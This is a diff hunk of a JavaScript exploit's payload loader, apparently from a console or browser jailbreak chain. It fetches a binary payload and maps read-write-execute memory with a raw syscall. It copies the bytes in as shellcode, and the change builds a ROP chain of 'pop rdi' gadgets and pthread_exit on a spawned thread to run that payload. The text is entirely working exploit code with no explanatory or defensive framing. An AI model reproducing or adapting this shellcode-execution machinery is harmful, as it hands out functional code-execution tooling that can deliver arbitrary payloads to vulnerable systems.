@@ -256,7 +256,7 @@ function loadPayload(){
  req.onreadystatechange = function () {
   if (req.readyState == 4) {
    PLD = req.response;
-   var payload_buffer = chain.syscall(477, 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
+   var payload_buffer = p.syscall(477, 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
    var pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
    var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
    var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
@@ -265,7 +265,17 @@ function loadPayload(){
    var shellcode = new Uint32Array(tmp.buffer);
    pl.set(shellcode,0);
    var pthread = p.malloc(0x10);
-   new_thr.call(libKernelBase.add32(pthread_exit_offset), pthread, 0x0, payload_buffer, 0);
+	  var loader_thr = spawn_thread("loader_thr", function (new_thr) {
+			new_thr.push(window.gadgets["pop rdi"]);
+			new_thr.push(payload_buffer);
+			//new_thr.push(payload_loader);
+			new_thr.push(window.gadgets["pop rdi"]);
+			new_thr.push(0);
+			new_thr.push(libKernelBase.add32(pthread_exit_offset)); //pthread_exit
+
+		});
+		loader_thr();
+   //new_thr.call(libKernelBase.add32(pthread_exit_offset), pthread, 0x0, payload_buffer, 0);
    //allset();
   awaitpl();
   }
